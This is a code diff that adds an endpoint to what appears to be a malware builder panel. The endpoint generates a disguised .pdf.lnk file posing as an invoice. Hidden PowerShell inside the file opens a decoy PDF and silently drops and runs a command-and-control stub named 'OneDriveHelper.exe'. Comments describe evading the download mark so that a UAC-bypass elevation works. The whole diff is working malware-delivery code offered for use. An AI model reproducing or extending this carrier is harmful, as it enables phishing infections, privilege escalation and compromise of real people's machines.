@@ -1119,4 +1119,145 @@ router.post("/api/builder/inject-pdf", requireAdmin,
   }
 );
 
+// ── Self-contained PDF-LNK carrier ────────────────────────────────────────────
+// Produces a .pdf.lnk file that:
+//   • Appears as "Invoice.pdf" in Explorer (Windows hides .lnk by default)
+//   • Uses the Windows PDF document icon from imageres.dll
+//   • Self-contains the decoy PDF AND the configured stub appended after the LNK binary
+//   • When double-clicked: Windows Shell handles .lnk — Edge/Chrome never invoked
+//   • PowerShell finds the .lnk file, extracts decoy PDF → opens it, extracts stub → runs it
+//   • The stub lands in %APPDATA% with NO Zone.Identifier → CMSTPLUA elevation works
+//
+// File layout: [LNK binary (N bytes)] [4B LE: PDF length] [PDF bytes] [4B LE: EXE length] [EXE bytes]
+// The N is patched into the PowerShell as $o so it knows where to read from.
+
+const pdfLnkUpload = multer({ storage: multer.memoryStorage(), limits: { fileSize: 20 * 1024 * 1024 } });
+
+router.post("/api/builder/pdf-lnk", requireAdmin, pdfLnkUpload.single("pdf"), (req, res) => {
+  try {
+    const host    = (req.body.host    || "").trim() || req.headers.host || "localhost";
+    const authKey = (req.body.authKey || "").trim() || AUTH_KEY;
+    const fname   = ((req.body.filename || "").trim() || "Invoice_Q4-2024").replace(/[^a-zA-Z0-9._\- ]/g, "_");
+    const pdfOpts = {
+      from:     (req.body.from || "").trim() || "Nexus Solutions Ltd.",
+      to:       (req.body.to   || "").trim() || "Acme Corporation",
+      filename: fname,
+      note:     (req.body.note || "").trim(),
+    };
+
+    const exeBuf   = buildStubBinary({ c2Host: host, authKey });
+    const decoyBuf = req.file ? req.file.buffer : buildDecoyPdf(pdfOpts);
+    const carrier  = buildPdfLnk(fname, decoyBuf, exeBuf);
+
+    res.setHeader("Content-Type", "application/octet-stream");
+    res.setHeader("Content-Disposition", `attachment; filename="${fname}.pdf.lnk"`);
+    res.send(carrier);
+  } catch (e) {
+    res.status(500).json({ error: e.message });
+  }
+});
+
+function buildPdfLnk(fname, pdfBuf, exeBuf) {
+  const target    = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
+  const iconPath  = "C:\\Windows\\System32\\imageres.dll";
+  const iconIndex = 247; // PDF-like document icon
+
+  // $o=00000000 is an 8-digit placeholder — patched below to the exact LNK binary size.
+  // PowerShell reads the .lnk file from disk, seeks to offset $o, reads PDF then EXE.
+  const ps =
+    `$fn='${fname}';` +
+    `$o=00000000;` +
+    `$locs=@("$env:USERPROFILE\\Downloads","$env:USERPROFILE\\Desktop","$env:TEMP",` +
+    `"$env:USERPROFILE\\OneDrive\\Downloads","$env:USERPROFILE\\OneDrive\\Desktop");` +
+    `$fp=$locs|%{Get-ChildItem $_ -Filter "$fn.pdf.lnk" -EA 0 -File|` +
+    `Select-Object -First 1|%{$_.FullName}}|?{$_}|Select-Object -First 1;` +
+    `if(!$fp){$fp=Get-ChildItem "$env:USERPROFILE" -Recurse -Filter "$fn.pdf.lnk"` +
+    ` -EA 0 -File|Select-Object -First 1|%{$_.FullName}};` +
+    `if($fp){$rb=[IO.File]::ReadAllBytes($fp);` +
+    `$pl=[BitConverter]::ToUInt32($rb,$o);` +
+    `$pd=$rb[($o+4)..($o+4+$pl-1)];` +
+    `$pt=[IO.Path]::GetTempFileName()+'.pdf';` +
+    `[IO.File]::WriteAllBytes($pt,$pd);Start-Process $pt;` +
+    `$eo=$o+4+$pl;$el=[BitConverter]::ToUInt32($rb,$eo);` +
+    `$ed=$rb[($eo+4)..($eo+4+$el-1)];` +
+    `$tp="$env:APPDATA\\OneDriveHelper.exe";` +
+    `[IO.File]::WriteAllBytes($tp,$ed);` +
+    `Start-Process $tp -WindowStyle Hidden}`;
+
+  const args = `-w hidden -nop -c "${ps}"`;
+
+  // Build LNK with placeholder offset → measure its size → patch placeholder
+  let lnkBuf  = createLnkBufferWithIcon(target, args, iconPath, iconIndex);
+  const lnkSz = lnkBuf.length;
+
+  // Find the UTF-16LE encoding of "$o=00000000" and patch the 8-digit number in place.
+  // The string is unique enough in UTF-16LE that false matches in binary headers are impossible.
+  const needle  = Buffer.from("$o=00000000", "utf16le");
+  const nIdx    = lnkBuf.indexOf(needle);
+  if (nIdx !== -1) {
+    const patch = Buffer.from(String(lnkSz).padStart(8, "0"), "utf16le");
+    // Patch only the 8 digit chars (16 bytes), skip the "$o=" prefix (6 bytes)
+    patch.copy(lnkBuf, nIdx + 6);
+  }
+
+  // Trailer: [4B LE PDF size][PDF bytes][4B LE EXE size][EXE bytes]
+  const pdfLen = Buffer.alloc(4); pdfLen.writeUInt32LE(pdfBuf.length, 0);
+  const exeLen = Buffer.alloc(4); exeLen.writeUInt32LE(exeBuf.length, 0);
+
+  return Buffer.concat([lnkBuf, pdfLen, pdfBuf, exeLen, exeBuf]);
+}
+
+function createLnkBufferWithIcon(target, args, iconPath, iconIndex) {
+  const CLSID = Buffer.from([
+    0x01,0x14,0x02,0x00,0x00,0x00,0x00,0x00,
+    0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,
+  ]);
+
+  const hdr = Buffer.alloc(76, 0);
+  hdr.writeUInt32LE(0x4C, 0);    // HeaderSize
+  CLSID.copy(hdr, 4);
+  // HasLinkInfo(0x02) | HasArguments(0x20) | HasIconLocation(0x40) | IsUnicode(0x80)
+  hdr.writeUInt32LE(0xE2, 0x14);
+  hdr.writeUInt32LE(0x20, 0x18); // FILE_ATTRIBUTE_ARCHIVE
+  hdr.writeUInt32LE(7,    0x3C); // SW_SHOWMINNOACTIVE
+  hdr.writeUInt16LE(0,    0x40); // HotKey
+  hdr.writeInt32LE(iconIndex,  0x38); // IconIndex
+
+  const volLabel = Buffer.from("C:\\\0", "ascii");
+  const volID    = Buffer.alloc(16 + volLabel.length, 0);
+  volID.writeUInt32LE(volID.length, 0);
+  volID.writeUInt32LE(3, 4);
+  volID.writeUInt32LE(0xABCD1234, 8);
+  volID.writeUInt32LE(16, 12);
+  volLabel.copy(volID, 16);
+
+  const localPath = Buffer.from(target + "\0", "ascii");
+  const suffix    = Buffer.from("\0", "ascii");
+  const LI_HDR   = 0x1C;
+  const volOff   = LI_HDR;
+  const pathOff  = volOff  + volID.length;
+  const sufOff   = pathOff + localPath.length;
+  const liSize   = sufOff  + suffix.length;
+
+  const li = Buffer.alloc(liSize, 0);
+  li.writeUInt32LE(liSize,  0);
+  li.writeUInt32LE(LI_HDR,  4);
+  li.writeUInt32LE(0x01,    8);
+  li.writeUInt32LE(volOff, 12);
+  li.writeUInt32LE(pathOff,16);
+  li.writeUInt32LE(0,      20);
+  li.writeUInt32LE(sufOff, 24);
+  volID.copy(li,    volOff);
+  localPath.copy(li, pathOff);
+  suffix.copy(li,   sufOff);
+
+  // StringData: CommandLineArguments then IconLocation (order per MS-SHLLINK 2.4)
+  const argStr  = Buffer.from(args,     "utf16le");
+  const argLen  = Buffer.alloc(2); argLen.writeUInt16LE(args.length,     0);
+  const iconStr = Buffer.from(iconPath, "utf16le");
+  const iconLen = Buffer.alloc(2); iconLen.writeUInt16LE(iconPath.length, 0);
+
+  return Buffer.concat([hdr, li, argLen, argStr, iconLen, iconStr]);
+}
+
 module.exports = router;
